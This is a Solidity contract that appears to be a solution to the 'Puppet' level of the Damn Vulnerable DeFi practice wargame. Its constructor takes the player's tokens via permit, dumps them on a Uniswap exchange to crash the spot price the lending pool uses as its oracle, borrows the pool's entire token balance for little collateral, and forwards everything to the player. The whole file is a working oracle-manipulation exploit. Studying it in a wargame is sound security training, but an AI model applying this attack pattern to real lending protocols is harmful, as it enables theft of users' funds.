// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";


contract PuppetAttack {
    using Address for address;

    PuppetPool public immutable lendingPool;
    DamnValuableToken public immutable token;
    address public immutable uniswapExchange;
    address public immutable player;

    constructor(
        PuppetPool _pool, 
        DamnValuableToken _token, 
        address _uniswapExchange, 
        address _player, 
        uint256 amount, 
        uint256 deadlinePermit, 
        uint8 v, 
        bytes32 r, 
        bytes32 s, 
        bytes memory data) payable {
        lendingPool = _pool;
        token = _token;
        uniswapExchange = _uniswapExchange;
        player = _player;

        token.permit(player, address(this), amount, deadlinePermit, v, r, s);
        token.transferFrom(player, address(this), amount);
        token.approve(uniswapExchange, amount);
        uniswapExchange.functionCall(data);
        lendingPool.borrow{value: address(this).balance}(token.balanceOf(address(lendingPool)), player);
        token.transfer(player, token.balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }

    receive() external payable {}
}
